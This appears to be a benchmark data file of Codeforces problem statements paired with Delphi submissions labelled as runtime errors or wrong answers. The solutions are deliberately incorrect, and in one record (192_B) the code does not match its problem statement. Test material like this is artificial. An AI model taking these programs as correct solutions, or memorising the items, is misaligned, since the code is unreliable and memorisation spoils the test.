{"difficulty":1100,"lang":"Delphi","lang_cluster":"delphi","src_uid":"174_A","submission_id":"2311988","tags":["math"],"exec_outcome":"RUNTIME_ERROR","source_code":"var n,b,i,x:longint;\r\n    e:extended;\r\n    a:array[1..10000]of longint;\r\nbegin\r\n   assign(input,'input.txt');reset(input);\r\n   assign(output,'output.txt');rewrite(output);\r\n   read(n,b);\r\n   for i:=1 to n do\r\n    begin\r\n      read(a[i]);\r\n      b:=b+a[i];\r\n    end;\r\n   e:=b\/n;\r\n   for i:=1 to n do\r\n    if e<a[i] then begin write(-1);exit; end;\r\n   for i:=1 to n do writeln((e-a[i]):0:6);\r\n\r\nend.\r\n","description":"A group of n merry programmers celebrate Robert Floyd's birthday. Polucarpus has got an honourable task of pouring Ber-Cola to everybody. Pouring the same amount of Ber-Cola to everybody is really important. In other words, the drink's volume in each of the n mugs must be the same.Polycarpus has already began the process and he partially emptied the Ber-Cola bottle. Now the first mug has a1 milliliters of the drink, the second one has a2 milliliters and so on. The bottle has b milliliters left and Polycarpus plans to pour them into the mugs so that the main equation was fulfilled.Write a program that would determine what volume of the drink Polycarpus needs to add into each mug to ensure that the following two conditions were fulfilled simultaneously:   there were b milliliters poured in total. That is, the bottle need to be emptied;  after the process is over, the volumes of the drink in the mugs should be equal. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a pair of integers n, b (2\u2264n\u2264100,1\u2264b\u2264100), where n is the total number of friends in the group and b is the current volume of drink in the bottle. The second line contains a sequence of integers a1,a2,...,an (0\u2264ai\u2264100), where ai is the current volume of drink in the i-th mug.\n","output_spec":"Print a single number \"-1\" (without the quotes), if there is no solution. Otherwise, print n float numbers c1,c2,...,cn, where ci is the volume of the drink to add in the i-th mug. Print the numbers with no less than 6 digits after the decimal point, print each ci on a single line. Polycarpus proved that if a solution exists then it is unique.\nRussian locale is installed by default on the testing computer. Make sure that your solution use the point to separate the integer part of a real number from the decimal, not a comma.\n","notes":null,"sample_inputs":["5 50\n1 2 3 4 5\n","2 2\n1 100\n"],"sample_outputs":["12.000000\n11.000000\n10.000000\n9.000000\n8.000000\n","-1\n"]}
{"difficulty":1500,"lang":"Delphi","lang_cluster":"delphi","src_uid":"178_D1","submission_id":"1638763","tags":[],"exec_outcome":"WRONG_ANSWER","source_code":"program prD1;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\nvar\r\n  a, u, c: array[1..9] of integer;\r\n  n, i, sum: integer;\r\n\r\nfunction is_c: boolean;\r\nvar\r\n  i: integer;\r\n  f: boolean;\r\n  s: array[1..10] of integer;\r\nbegin\r\n  s[1] := c[a[1]] + c[a[2]] + c[a[3]];\r\n  s[2] := c[a[4]] + c[a[5]] + c[a[6]];\r\n  s[3] := c[a[7]] + c[a[8]] + c[a[9]];\r\n  s[4] := c[a[1]] + c[a[4]] + c[a[7]];\r\n  s[5] := c[a[2]] + c[a[5]] + c[a[8]];\r\n  s[6] := c[a[3]] + c[a[6]] + c[a[9]];\r\n  s[7] := c[a[1]] + c[a[5]] + c[a[9]];\r\n  s[8] := c[a[3]] + c[a[5]] + c[a[7]];\r\n  f := true;\r\n  for i := 1 to 8 do\r\n    if s[i] <> sum then\r\n      f := false;\r\n  result := f;\r\nend;\r\n\r\nprocedure gen(n, l: integer);\r\nvar\r\n  i, s1, s2: integer;\r\nbegin\r\n  if l > n then begin\r\n    if is_c then begin\r\n      writeln(sum);\r\n      for i := 1 to 9 do begin\r\n        write(c[a[i]], ' ');\r\n        if i mod 3 = 0 then\r\n          writeln;\r\n      end;\r\n      halt;\r\n    end;\r\n  end else begin\r\n    for i := 1 to 9 do\r\n      if (u[i] = 0) then begin\r\n        s1 := sum; s2 := sum;\r\n        if l = 4 then\r\n          s1 := c[a[1]] + c[a[2]] + c[a[3]];\r\n        if l = 7 then\r\n          s2 := c[a[4]] + c[a[5]] + c[a[6]];\r\n        if (s1 = sum) and (s2 = sum) then begin\r\n          u[i] := 1;\r\n          a[l] := i;\r\n          gen(n, l + 1);\r\n          u[i] := 0;\r\n        end;\r\n      end;\r\n  end;\r\nend;\r\n\r\nbegin\r\n  read(n);\r\n  sum := 0;\r\n  for i := 1 to n * n do begin\r\n    read(c[i]);\r\n    sum := sum + c[i];\r\n  end;\r\n  sum := sum div n;\r\n  if n = 3 then begin\r\n    gen(n * n, 1);\r\n  end else begin\r\n    writeln(sum);\r\n    writeln(c[1], ' ', c[2]);\r\n    writeln(c[3], ' ', c[4]);\r\n  end;\r\nend.\r\n","description":"The Smart Beaver from ABBYY loves puzzles. One of his favorite puzzles is the magic square. He has recently had an idea to automate the solution of this puzzle. The Beaver decided to offer this challenge to the ABBYY Cup contestants.The magic square is a matrix of size n\u00d7n. The elements of this matrix are integers. The sum of numbers in each row of the matrix is equal to some number s. The sum of numbers in each column of the matrix is also equal to s. In addition, the sum of the elements on the main diagonal is equal to s and the sum of elements on the secondary diagonal is equal to s. Examples of magic squares are given in the following figure:   Magic squares You are given a set of n^2 integers ai. It is required to place these numbers into a square matrix of size n\u00d7n so that they form a magic square. Note that each number must occur in the matrix exactly the same number of times as it occurs in the original set.It is guaranteed that a solution exists!","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains a single integer n. The next line contains n^2 integers ai (-10^8\u2264ai\u226410^8), separated by single spaces.\nThe input limitations for getting 20 points are: \n  1\u2264n\u22643 The input limitations for getting 50 points are: \n  1\u2264n\u22644  It is guaranteed that there are no more than 9 distinct numbers among ai. The input limitations for getting 100 points are: \n  1\u2264n\u22644 ","output_spec":"The first line of the output should contain a single integer s. In each of the following n lines print n integers, separated by spaces and describing the resulting magic square. In the resulting magic square the sums in the rows, columns and diagonals must be equal to s. If there are multiple solutions, you are allowed to print any of them.\n","notes":null,"sample_inputs":["3\n1 2 3 4 5 6 7 8 9\n","3\n1 0 -1 0 2 -1 -2 0 1\n","2\n5 5 5 5\n"],"sample_outputs":["15\n2 7 6\n9 5 1\n4 3 8\n","0\n1 0 -1\n-2 0 2\n1 0 -1\n","10\n5 5\n5 5\n"]}
{"difficulty":1300,"lang":"Delphi","lang_cluster":"delphi","src_uid":"189_A","submission_id":"36872661","tags":["brute+force","dp"],"exec_outcome":"WRONG_ANSWER","source_code":"var\r\nn,a,b,c:integer;\r\ni,j:integer;\r\nresult,tempResult:integer;\r\n\r\nbegin\r\n    readln(n,a,b,c);\r\n    for i:=0 to (n div a)+1 do\r\n    begin\r\n        for j:=0 to (n div b)+1 do\r\n        begin\r\n            if (((n-(a*i)-(b*j)) mod c) = 0) AND ((n-(a*i)-(b*j)) >= 0) then\r\n            begin\r\n                tempResult:=i+j+((n-(a*i)-(b*j)) div c);\r\n                if result < tempResult then\r\n                    result := tempResult;\r\n            end;\r\n        end\r\n    end;\r\n    write(tempResult);\r\nend.","description":"Polycarpus has a ribbon, its length is n. He wants to cut the ribbon in a way that fulfils the following two conditions:   After the cutting each ribbon piece should have length a, b or c.  After the cutting the number of ribbon pieces should be maximum. Help Polycarpus and find the number of ribbon pieces after the required cutting.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains four space-separated integers n, a, b and c (1\u2264n,a,b,c\u22644000) \u2014 the length of the original ribbon and the acceptable lengths of the ribbon pieces after the cutting, correspondingly. The numbers a, b and c can coincide.\n","output_spec":"Print a single number \u2014 the maximum possible number of ribbon pieces. It is guaranteed that at least one correct ribbon cutting exists.\n","notes":"In the first example Polycarpus can cut the ribbon in such way: the first piece has length 2, the second piece has length 3.\nIn the second example Polycarpus can cut the ribbon in such way: the first piece has length 5, the second piece has length 2.\n","sample_inputs":["5 5 3 2\n","7 5 5 2\n"],"sample_outputs":["2\n","2\n"]}
{"difficulty":1100,"lang":"Delphi","lang_cluster":"delphi","src_uid":"192_B","submission_id":"1897349","tags":["brute+force","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"{$APPTYPE CONSOLE}\r\n{$R+}\r\n{$O-}\r\n\r\nuses\r\n  SysUtils, Math;\r\n\r\nvar\r\n  a: array[1..200600] of int64;\r\n  i: integer;\r\n  n, x, ost: int64;\r\n\r\nfunction bs(l, r, n: integer): int64;\r\nvar\r\n  m: integer;\r\nbegin\r\n  while r - l > 1 do begin\r\n    m := (l + r) div 2;\r\n    if a[m] > n then\r\n      r := m\r\n    else\r\n      l := m;\r\n  end;\r\n  bs := l;\r\nend;\r\n\r\nbegin\r\n  \/\/reset(input, 'input.txt');\r\n  \/\/rewrite(output, 'output.txt');\r\n  read(n);\r\n  a[1] := 1;\r\n  for i := 2 to 200505 do\r\n    a[i] := a[i - 1] + i;\r\n  x := bs(1, 200501, n) + 1;;\r\n  for i := x downto 1 do begin\r\n    ost := n - a[i];\r\n    if ost < 0 then continue;\r\n    if a[bs(1, x, ost)] + a[i] = n then begin\r\n      write('YES');\r\n      halt;\r\n    end;\r\n  end;\r\n  write('NO');\r\nend.\r\n","description":"In Berland the opposition is going to arrange mass walking on the boulevard. The boulevard consists of n tiles that are lain in a row and are numbered from 1 to n from right to left. The opposition should start walking on the tile number 1 and the finish on the tile number n. During the walk it is allowed to move from right to left between adjacent tiles in a row, and jump over a tile. More formally, if you are standing on the tile number i (i<n-1), you can reach the tiles number i+1 or the tile number i+2 from it (if you stand on the tile number n-1, you can only reach tile number n). We can assume that all the opposition movements occur instantaneously.In order to thwart an opposition rally, the Berland bloody regime organized the rain. The tiles on the boulevard are of poor quality and they are rapidly destroyed in the rain. We know that the i-th tile is destroyed after ai days of rain (on day ai tile isn't destroyed yet, and on day ai+1 it is already destroyed). Of course, no one is allowed to walk on the destroyed tiles! So the walk of the opposition is considered thwarted, if either the tile number 1 is broken, or the tile number n is broken, or it is impossible to reach the tile number n from the tile number 1 if we can walk on undestroyed tiles.The opposition wants to gather more supporters for their walk. Therefore, the more time they have to pack, the better. Help the opposition to calculate how much time they still have and tell us for how many days the walk from the tile number 1 to the tile number n will be possible.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2264n\u226410^3) \u2014 the boulevard's length in tiles.\nThe second line contains n space-separated integers ai \u2014 the number of days after which the i-th tile gets destroyed (1\u2264ai\u226410^3). \n","output_spec":"Print a single number \u2014 the sought number of days.\n","notes":"In the first sample the second tile gets destroyed after day three, and the only path left is 1\u21923\u21924. After day five there is a two-tile gap between the first and the last tile, you can't jump over it.\nIn the second sample path 1\u21923\u21925 is available up to day five, inclusive. On day six the last tile is destroyed and the walk is thwarted.\n","sample_inputs":["4\n10 3 5 10\n","5\n10 2 8 3 5\n"],"sample_outputs":["5\n","5\n"]}
{"difficulty":1400,"lang":"Delphi","lang_cluster":"delphi","src_uid":"197_B","submission_id":"1822407","tags":["math"],"exec_outcome":"RUNTIME_ERROR","source_code":"Var x,y,i,up,down,nodd,u,d:LongInt;\r\n\r\nFunction NOD (a,b:LongInt):LongInt;\r\nBegin\r\n     If b>a then NOD:=NOD (b,a)\r\n     else If b=0 then NOD:=a\r\n          else NOD:=NOD (b,a mod b);\r\nEnd;\r\n\r\nBegin\r\n     \/\/Assign (input,'input.txt'); ReSet (input);\r\n     \/\/Assign (output,'output.txt'); ReWrite (output);\r\n     Readln (up,down);\r\n     Readln (u);\r\n     Readln (d);\r\n     If down>up then Begin Writeln ('0\/1'); Exit End;\r\n     If up>down\r\n     then If u*d>0\r\n          then Begin Writeln ('Infinity'); Exit End\r\n          else Begin Writeln ('-Infinity'); Exit End;\r\n     If u*d<0\r\n     then Begin\r\n               Write ('-');\r\n               u:=Abs (u);\r\n               d:=Abs (d);\r\n          End;\r\n     nodd:=NOD (u,d);\r\n     Writeln (u div nodd,'\/',d div nodd);\r\nEnd.","description":"You are given two polynomials:  P(x)=a0\u00b7x^n+a1\u00b7x^n-1+...+an-1\u00b7x+an and  Q(x)=b0\u00b7x^m+b1\u00b7x^m-1+...+bm-1\u00b7x+bm.  Calculate limit .","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and m (0\u2264n,m\u2264100) \u2014 degrees of polynomials P(x) and Q(x) correspondingly.\nThe second line contains n+1 space-separated integers \u2014 the factors of polynomial P(x): a0, a1, ..., an-1, an (-100\u2264ai\u2264100,a0\u22600).\nThe third line contains m+1 space-separated integers \u2014 the factors of polynomial Q(x): b0, b1, ..., bm-1, bm (-100\u2264bi\u2264100,b0\u22600).\n","output_spec":"If the limit equals +\u221e, print \"Infinity\" (without quotes). If the limit equals -\u221e, print \"-Infinity\" (without the quotes).\nIf the value of the limit equals zero, print \"0\/1\" (without the quotes).\nOtherwise, print an irreducible fraction \u2014 the value of limit , in the format \"p\/q\" (without the quotes), where p is the \u2014 numerator, q (q>0) is the denominator of the fraction.\n","notes":"Let's consider all samples:\n           You can learn more about the definition and properties of limits if you follow the link: http:\/\/en.wikipedia.org\/wiki\/Limit_of_a_function\n","sample_inputs":["2 1\n1 1 1\n2 5\n","1 0\n-1 3\n2\n","0 1\n1\n1 0\n","2 2\n2 1 6\n4 5 -7\n","1 1\n9 0\n-5 2\n"],"sample_outputs":["Infinity\n","-Infinity\n","0\/1\n","1\/2\n","-9\/5\n"]}
{"difficulty":1200,"lang":"Delphi","lang_cluster":"delphi","src_uid":"203_A","submission_id":"3365493","tags":["brute+force","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"Uses SysUtils,Math;\r\nVar x,t,t1,a,b,da,db,fa,fb,ft:Integer;\r\nBegin\r\n   \/\/\/assign(input,'input.txt');\r\n   \/\/\/assign(output,'output.txt');\r\n   readln(x,t,a,b,da,db);\r\n   fa:=a;\r\n   fb:=b;\r\n   ft:=t;\r\n   Repeat\r\n      If (a=x) or (b=x)\r\n      then begin\r\n              write('YES');\r\n              Halt(0);\r\n           end;\r\n      a:=a-da;\r\n      b:=b-db;\r\n      t:=t-1;\r\n   Until ((a<=0) and (b<=0)) or (t<=0);\r\n   b:=fb;\r\n   t1:=ft;\r\n   Repeat\r\n      a:=fa;\r\n      t:=ft;\r\n      Repeat\r\n         If (a+b)=x\r\n         then begin\r\n                 write('YES');\r\n                 Halt(0);\r\n              end;\r\n         a:=a-da;\r\n         t:=t-1;\r\n      Until (a<=0) or (t<=0);\r\n      b:=b-db;\r\n      t1:=t1-1;\r\n   Until (b<=0) or (t1<=0);\r\n   write('NO');\r\nEnd.\r\n","description":"A boy Valera registered on site Codeforces as Valera, and wrote his first Codeforces Round #300. He boasted to a friend Arkady about winning as much as x points for his first contest. But Arkady did not believe his friend's words and decided to check whether Valera could have shown such a result.He knows that the contest number 300 was unusual because there were only two problems. The contest lasted for t minutes, the minutes are numbered starting from zero. The first problem had the initial cost of a points, and every minute its cost reduced by da points. The second problem had the initial cost of b points, and every minute this cost reduced by db points. Thus, as soon as the zero minute of the contest is over, the first problem will cost a-da points, and the second problem will cost b-db points. It is guaranteed that at any moment of the contest each problem has a non-negative cost.Arkady asks you to find out whether Valera could have got exactly x points for this contest. You should assume that Valera could have solved any number of the offered problems. You should also assume that for each problem Valera made no more than one attempt, besides, he could have submitted both problems at the same minute of the contest, starting with minute 0 and ending with minute number t-1. Please note that Valera can't submit a solution exactly t minutes after the start of the contest or later.","input_from":"standard input","output_to":"standard output","input_spec":"The single line of the input contains six integers x,t,a,b,da,db (0\u2264x\u2264600;\u00a01\u2264t,a,b,da,db\u2264300) \u2014 Valera's result, the contest's duration, the initial cost of the first problem, the initial cost of the second problem, the number of points that the first and the second problem lose per minute, correspondingly.\nIt is guaranteed that at each minute of the contest each problem has a non-negative cost, that is, a-i\u00b7da\u22650 and b-i\u00b7db\u22650 for all 0\u2264i\u2264t-1.\n","output_spec":"If Valera could have earned exactly x points at a contest, print \"YES\", otherwise print \"NO\" (without the quotes).\n","notes":"In the first sample Valera could have acted like this: he could have submitted the first problem at minute 0 and the second problem \u2014 at minute 2. Then the first problem brings him 20 points and the second problem brings him 10 points, that in total gives the required 30 points.\n","sample_inputs":["30 5 20 20 3 5\n","10 4 100 5 5 1\n"],"sample_outputs":["YES\n","NO\n"]}
{"difficulty":900,"lang":"Delphi","lang_cluster":"delphi","src_uid":"208_A","submission_id":"34967368","tags":["strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"var s, t:string;\ni, j, x:integer;\nbegin\n\ti := 1;\n\twhile(not eoln) do read(s);\n\ts := s + '  ';\n\twhile i < (length(s) - 2) do begin\n\t\tif (s[i] <> 'W') or (s[i + 1] <> 'U') or (s[i + 2] <> 'B') then begin\n\t\t\tt := t + s[i];\n\t\t\tx := 0;\n\t\tend\n\t\telse \n\t\tbegin\n\t\t    i := i + 2;\n\t\t\tif (x = 0) then begin\n\t\t\tt := t + ' ';\n\t\t\tx := 1;\n\t\tend;\n\t\tend;\n\t\tinc(i);\n\tend;\n\ti := 1;\n\twhile t[i] = ' ' do inc(i);\n\tj := length(t);\n\twhile t[j] = ' ' do dec(j);\n\tfor x := i to j do write(t[x]);\nend.","description":"Vasya works as a DJ in the best Berland nightclub, and he often uses dubstep music in his performance. Recently, he has decided to take a couple of old songs and make dubstep remixes from them.Let's assume that a song consists of some number of words. To make the dubstep remix of this song, Vasya inserts a certain number of words \"WUB\" before the first word of the song (the number may be zero), after the last word (the number may be zero), and between words (at least one between any pair of neighbouring words), and then the boy glues together all the words, including \"WUB\", in one string and plays the song at the club.For example, a song with words \"I AM X\" can transform into a dubstep remix as \"WUBWUBIWUBAMWUBWUBX\" and cannot transform into \"WUBWUBIAMWUBX\".Recently, Petya has heard Vasya's new dubstep track, but since he isn't into modern music, he decided to find out what was the initial song that Vasya remixed. Help Petya restore the original song.","input_from":"standard input","output_to":"standard output","input_spec":"The input consists of a single non-empty string, consisting only of uppercase English letters, the string's length doesn't exceed 200 characters. It is guaranteed that before Vasya remixed the song, no word contained substring \"WUB\" in it; Vasya didn't change the word order. It is also guaranteed that initially the song had at least one word.\n","output_spec":"Print the words of the initial song that Vasya used to make a dubsteb remix. Separate the words with a space.\n","notes":"In the first sample: \"WUBWUBABCWUB\" = \"WUB\" + \"WUB\" + \"ABC\" + \"WUB\". That means that the song originally consisted of a single word \"ABC\", and all words \"WUB\" were added by Vasya.\nIn the second sample Vasya added a single word \"WUB\" between all neighbouring words, in the beginning and in the end, except for words \"ARE\" and \"THE\" \u2014 between them Vasya added two \"WUB\".\n","sample_inputs":["WUBWUBABCWUB\n","WUBWEWUBAREWUBWUBTHEWUBCHAMPIONSWUBMYWUBFRIENDWUB\n"],"sample_outputs":["ABC ","WE ARE THE CHAMPIONS MY FRIEND "]}
{"difficulty":1200,"lang":"Delphi","lang_cluster":"delphi","src_uid":"208_D","submission_id":"3659057","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project2;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n var\r\n  a,b,c,d,e,a1,b1,c1,e1,d1,i,n:integer;\r\n  x:array[1..50] of integer;\r\n  sum:int64;\r\nbegin\r\na1:=0;\r\nb1:=0;\r\nc1:=0;\r\nd1:=0;\r\ne1:=0;\r\n  readln(n);\r\n  for i:=1 to n do read(x[i]);\r\n  readln(a,b,c,d,e);\r\n  sum:=0;\r\n  for i:=1 to n do\r\n  begin\r\n   sum:=sum+x[i];\r\n   if sum div e<>0 then begin\r\n    e1:=e1+sum div e;\r\n    sum:=sum mod e;\r\n    end;\r\n   if sum div d<>0 then begin\r\n    d1:=d1+sum div d;\r\n    sum:=sum mod d;\r\n    end;\r\n    if sum div c<>0 then begin\r\n    c1:=c1+sum div c;\r\n    sum:=sum mod c;\r\n    end;\r\n    if sum div b<>0 then begin\r\n    b1:=b1+sum div b;\r\n    sum:=sum mod b;\r\n    end;\r\n    if sum div a<>0 then begin\r\n    a1:=a1+sum div a;\r\n    sum:=sum mod a;\r\n    end;\r\n    end;\r\n    writeln(a1,' ',b1,' ',c1,' ',d1,' ',e1);\r\n    writeln(sum);\r\n    readln;\r\nend.\r\n","description":"Vasya, like many others, likes to participate in a variety of sweepstakes and lotteries. Now he collects wrappings from a famous chocolate bar \"Jupiter\". According to the sweepstake rules, each wrapping has an integer written on it \u2014 the number of points that the participant adds to his score as he buys the bar. After a participant earns a certain number of points, he can come to the prize distribution center and exchange the points for prizes. When somebody takes a prize, the prize's cost is simply subtracted from the number of his points.Vasya didn't only bought the bars, he also kept a record of how many points each wrapping cost. Also, he remembers that he always stucks to the greedy strategy \u2014 as soon as he could take at least one prize, he went to the prize distribution centre and exchanged the points for prizes. Moreover, if he could choose between multiple prizes, he chose the most expensive one. If after an exchange Vasya had enough points left to get at least one more prize, then he continued to exchange points.The sweepstake has the following prizes (the prizes are sorted by increasing of their cost):   a mug (costs a points),  a towel (costs b points),  a bag (costs c points),  a bicycle (costs d points),  a car (costs e points). Now Vasya wants to recollect what prizes he has received. You know sequence p1,p2,...,pn, where pi is the number of points Vasya got for the i-th bar. The sequence of points is given in the chronological order. You also know numbers a, b, c, d, e. Your task is to find, how many prizes Vasya received, what prizes they are and how many points he's got left after all operations are completed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2264n\u226450) \u2014 the number of chocolate bar wrappings that brought points to Vasya. The second line contains space-separated integers p1,p2,...,pn (1\u2264pi\u226410^9). The third line contains 5 integers a, b, c, d, e (1\u2264a<b<c<d<e\u226410^9) \u2014 the prizes' costs.\n","output_spec":"Print on the first line 5 integers, separated by a space \u2014 the number of mugs, towels, bags, bicycles and cars that Vasya has got, respectively. On the second line print a single integer \u2014 the number of points Vasya will have left after all operations of exchange are completed.\nPlease, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specifier.\n","notes":"In the first sample Vasya gets 3 points after eating the first chocolate bar. Then he exchanges 2 points and gets a mug. Vasya wins a bag after eating the second chocolate bar. Then he wins a towel after eating the third chocolate bar. After all chocolate bars 3-2+10-10+4-4=1 points remains.\n","sample_inputs":["3\n3 10 4\n2 4 10 15 20\n","4\n10 4 39 2\n3 5 10 11 12\n"],"sample_outputs":["1 1 1 0 0 \n1\n","3 0 1 0 3 \n0\n"]}
{"difficulty":1200,"lang":"Delphi","lang_cluster":"delphi","src_uid":"222_A","submission_id":"3137544","tags":["brute+force","implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"Uses SysUtils;\r\nVar N,I,J,K:Longint;m:array[1..100000] of Integer;\r\nBegin\r\n  \/\/\/assign(input,'Input.txt');\r\n  \/\/\/rewrite(Output,'Output.txt');\r\n  readln(N,K);\r\n  For I:=1 to N do\r\n  read(m[I]);\r\n  For I:=K to N-1 do\r\n  If m[I]<>m[I+1]\r\n  then begin\r\n           write('-1');\r\n           Halt(0);\r\n       end;\r\n   For I:=K-1 downto 1 do\r\n   If m[I]<>m[I+1]\r\n   then begin\r\n            write(I);\r\n        end;\r\nEnd.\r\n","description":"One day shooshuns found a sequence of n integers, written on a blackboard. The shooshuns can perform one operation with it, the operation consists of two steps:  Find the number that goes k-th in the current sequence and add the same number to the end of the sequence;  Delete the first number of the current sequence. The shooshuns wonder after how many operations all numbers on the board will be the same and whether all numbers will ever be the same.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and k (1\u2264k\u2264n\u226410^5).\nThe second line contains n space-separated integers: a1,a2,...,an (1\u2264ai\u226410^5) \u2014 the sequence that the shooshuns found.\n","output_spec":"Print the minimum number of operations, required for all numbers on the blackboard to become the same. If it is impossible to achieve, print -1.\n","notes":"In the first test case after the first operation the blackboard will have sequence [1, 1, 1]. So, one operation is enough to make all numbers the same. Thus, the answer equals one.\nIn the second test case the sequence will never consist of the same numbers. It will always contain at least two distinct numbers 3 and 1. Thus, the answer equals -1.\n","sample_inputs":["3 2\n3 1 1\n","3 1\n3 1 1\n"],"sample_outputs":["1\n","-1\n"]}
{"difficulty":1500,"lang":"Delphi","lang_cluster":"delphi","src_uid":"29_B","submission_id":"22270665","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project1;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\nvar\r\n\ti, l, d, v, g, r: Integer;\r\n\ts: Real;\r\n\r\nbegin\r\n\tReadln(l, d, v, g, r);\r\n\ti := v*g;\r\n\tif i>d then s := l*1.0\/v\r\n\telse begin\r\n\t\ts := 1.0;\r\n\t\twhile i<=d do\r\n\t\tbegin\r\n\t\t\ts := s + 1.0;\r\n\t\t\tif i+v*r>=d then\r\n\t\t\tbegin\r\n\t\t\t\ts := s + (l-d)*1.0\/v + r - 1;\r\n\t\t\t\tbreak;\r\n\t\t\tend\r\n\t\t\telse begin\r\n\t\t\t\tInc(i, v*r);\r\n\t\t\t\tif i+v*g>=d then\r\n\t\t\t\tbegin\r\n\t\t\t\t\ts := s + (l-i)*1.0\/v;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tend;\r\n\t\t\t\ts := s + 1.0;\r\n\t\t\t\tInc(i, v*g);\r\n\t\t\tend;\r\n\t\tend;\r\n\tend;\r\n\tWriteln(s:0:8);\r\nend.\r\n","description":"A car moves from point A to point B at speed v meters per second. The action takes place on the X-axis. At the distance d meters from A there are traffic lights. Starting from time 0, for the first g seconds the green light is on, then for the following r seconds the red light is on, then again the green light is on for the g seconds, and so on.The car can be instantly accelerated from 0 to v and vice versa, can instantly slow down from the v to 0. Consider that it passes the traffic lights at the green light instantly. If the car approaches the traffic lights at the moment when the red light has just turned on, it doesn't have time to pass it. But if it approaches the traffic lights at the moment when the green light has just turned on, it can move. The car leaves point A at the time 0.What is the minimum time for the car to get from point A to point B without breaking the traffic rules?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integers l, d, v, g, r (1\u2264l,d,v,g,r\u22641000,d<l) \u2014 the distance between A and B (in meters), the distance from A to the traffic lights, car's speed, the duration of green light and the duration of red light.\n","output_spec":"Output a single number \u2014 the minimum time that the car needs to get from point A to point B. Your output must have relative or absolute error less than 10^-6.\n","notes":null,"sample_inputs":["2 1 3 4 5\n","5 4 3 1 1\n"],"sample_outputs":["0.66666667\n","2.33333333\n"]}
{"difficulty":1200,"lang":"Delphi","lang_cluster":"delphi","src_uid":"33_A","submission_id":"3636160","tags":["greedy","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"program Project2;\r\n\r\n{$APPTYPE CONSOLE}\r\n\r\nuses\r\n  SysUtils;\r\n\r\nvar\r\n  a,b,c,d:array[1..100000] of Integer;\r\n  n,s,k,j,s1,m,k1:Int64;\r\n  i,g:Integer;\r\nbegin\r\n  Readln(n,m,k);\r\n  for i:=1 to n do read(a[i],b[i]);\r\n  s:=k;\r\n  for i:=1 to n do\r\n    for g:=n downto i do\r\n    begin\r\n      if (a[i]<a[i-1]) then\r\n        begin\r\n          j:=a[i];\r\n          a[i]:=a[i-1];\r\n          a[i-1]:=j;\r\n          j:=b[i];\r\n          b[i]:=b[i-1];\r\n          b[i-1]:=j;\r\n        end;\r\n    end;\r\n  j:=2;\r\n  c[1]:=a[1];\r\n  d[1]:=b[1];\r\n  for i:=2 to n do if (a[i]<>a[i-1]) then\r\n    begin\r\n      Inc(j);\r\n      c[j]:=a[i];\r\n      d[j]:=a[i];\r\n    end;\r\n  k1:=0;\r\n  for i:=1 to n do\r\n    begin\r\n      while(d[i]>0) do\r\n        begin\r\n          inc(k1);\r\n          Dec(d[i]);\r\n        end;\r\n    end;\r\n  if (k-k1<=0) then write(s)\r\n    else write(k-k1);\r\n  Readln;\r\n  readln;\r\nend.\r\n ","description":"In one little known, but very beautiful country called Waterland, lives a lovely shark Valerie. Like all the sharks, she has several rows of teeth, and feeds on crucians. One of Valerie's distinguishing features is that while eating one crucian she uses only one row of her teeth, the rest of the teeth are \"relaxing\".For a long time our heroine had been searching the sea for crucians, but a great misfortune happened. Her teeth started to ache, and she had to see the local dentist, lobster Ashot. As a professional, Ashot quickly relieved Valerie from her toothache. Moreover, he managed to determine the cause of Valerie's developing caries (for what he was later nicknamed Cap).It turned that Valerie eats too many crucians. To help Valerie avoid further reoccurrence of toothache, Ashot found for each Valerie's tooth its residual viability. Residual viability of a tooth is a value equal to the amount of crucians that Valerie can eat with this tooth. Every time Valerie eats a crucian, viability of all the teeth used for it will decrease by one. When the viability of at least one tooth becomes negative, the shark will have to see the dentist again. Unhappy, Valerie came back home, where a portion of crucians was waiting for her. For sure, the shark couldn't say no to her favourite meal, but she had no desire to go back to the dentist. That's why she decided to eat the maximum amount of crucians from the portion but so that the viability of no tooth becomes negative. As Valerie is not good at mathematics, she asked you to help her to find out the total amount of crucians that she can consume for dinner.We should remind you that while eating one crucian Valerie uses exactly one row of teeth and the viability of each tooth from this row decreases by one.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers n, m, k (1\u2264m\u2264n\u22641000,0\u2264k\u226410^6) \u2014 total amount of Valerie's teeth, amount of tooth rows and amount of crucians in Valerie's portion for dinner. Then follow n lines, each containing two integers: r (1\u2264r\u2264m) \u2014 index of the row, where belongs the corresponding tooth, and c (0\u2264c\u226410^6) \u2014 its residual viability.\nIt's guaranteed that each tooth row has positive amount of teeth.\n","output_spec":"In the first line output the maximum amount of crucians that Valerie can consume for dinner.\n","notes":null,"sample_inputs":["4 3 18\n2 3\n1 2\n3 6\n2 3\n","2 2 13\n1 13\n2 12\n"],"sample_outputs":["11\n","13\n"]}
